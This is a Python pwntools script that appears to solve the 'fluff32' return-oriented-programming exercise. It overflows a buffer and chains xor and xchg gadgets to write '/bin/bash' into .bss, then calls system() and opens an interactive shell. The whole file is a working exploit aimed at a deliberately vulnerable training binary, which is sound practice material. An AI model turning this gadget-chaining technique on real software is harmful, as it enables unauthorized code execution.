from pwn import *

_cmd = b"/bin/bash"
_system = p32(0x08048430)
_bss = 0x0804a044
_defaced = p32(0x0804868c) # mov edx, 0xdefaced0 ; ret
_xchg = p32(0x08048689)    # xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
_pop_xor = p32(0x08048696) # pop ebx ; xor byte ptr [ecx], bl ; ret
_pop_ebx = p32(0x080483e1) # pop ebx ; ret
_xor_edx = p32(0x0804867b) # xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret

payload = b"A" * 40 + b"EBP4"
payload += _defaced

for i in range(len(_cmd)):
    payload += _pop_ebx
    payload += p32(0xdefaced0 ^ (_bss + i))
    payload += _xor_edx
    payload += b"pop1"
    payload += _xchg
    payload += b"pop1"
    payload += _pop_xor
    payload += p32(_cmd[i])

payload += _system
payload += b"fake"
payload += p32(_bss)

fluff32 = process('fluff32')
fluff32.recv()
fluff32.sendline(payload)
fluff32.interactive()

